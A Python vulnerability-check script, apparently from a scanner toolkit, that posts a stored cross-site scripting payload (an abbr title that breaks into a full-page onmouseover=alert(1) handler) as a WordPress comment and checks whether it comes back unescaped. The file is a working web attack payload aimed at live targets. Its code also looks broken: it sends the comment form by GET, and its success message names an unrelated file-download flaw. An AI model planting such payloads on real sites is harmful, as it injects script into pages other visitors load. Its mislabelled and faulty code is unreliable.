# -*- coding:utf-8 -*-
"""
@author: ChanGeZ
@file: wordpress_comment_storeXSS.py
@time: 2018/3/6 下午 06:42
"""

import sys
import requests
import warnings
from termcolor import cprint


class wordpress_comment_storeXSS_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = '<abbr title="qweqw style=display:block;position:fixed;width:100%;height:100%;top:0; onmouseover=alert(1)// 𝌆">'
        data = {'author': 'xxxxss', 'email': 'xxxs@Qqqc.ccc', 'url': '', 'comment': payload, 'submit': '发表评论', 'comment_post_ID': 1, 'comment_parent': 0}
        vulnurl = self.url + '?p=1'
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False, data=data)
            print(req.status_code)
            if r"<p><abbr title=&#8221;qweqw style=display:block;position:fixed;width:100%;height:100%;top:0; onmouseover=alert(1)// </p>" in req.text:
                result = "[+]存在wordpress admin-ajax.php任意文件下载漏洞...(高危)\tpayload: " + vulnurl
                cprint(result, "red")
                return ['success', result]
            print(2)
            return 'failed'
        except:
            cprint("[-] " + __file__ + "====>连接超时", "cyan")
            return 'failed'

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    # testVuln = wordpress_comment_storeXSS_BaseVerify(sys.argv[1])
    testVuln = wordpress_comment_storeXSS_BaseVerify('http://192.168.25.143')
    testVuln.run()
